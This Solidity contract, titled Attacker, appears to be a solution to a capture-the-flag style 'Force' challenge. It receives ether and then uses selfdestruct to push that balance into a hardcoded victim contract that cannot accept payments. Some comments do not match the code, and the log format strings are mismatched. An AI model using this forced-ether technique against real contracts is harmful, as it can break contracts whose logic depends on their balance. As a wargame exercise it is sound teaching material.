// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";
import "hardhat/console.sol";

contract Attacker {
    Force victimContract; //Contractname contractvariable

    address payable victimAddress = 0xD3a8e62a14410F3bCA078A2d7ccE422Bf0B77C48; 
    event depositEmitter(address indexed senderAddr, uint senderValue, uint currentBalance);
    
    event selfDestructEmitter(address indexed senderAddr);

    
    // import a contract
    constructor() public {
        victimContract = Force(victimAddress);
    }

    function depositMoney() public payable {
        // Should emit the current balance of the contrac
        uint balance = address(this).balance;
        emit depositEmitter(msg.sender, msg.value, balance);
        console.log(
        "Depositing from %s to %s... %s tokens",
        msg.sender,
        msg.value,
        balance
    );
    }

    function selfDestruct() external {
        // should overflow
        // victimContract.transfer(playerAddress);
        emit selfDestructEmitter(msg.sender);
        console.log(
        "self destructing...sent by %s",
        msg.sender);
        selfdestruct(victimAddress);
    }

    // function sendAttackerMessage(address _attackerAddress) external{
    //   victimContract.changeOwner(_attackerAddress);
    // }
}
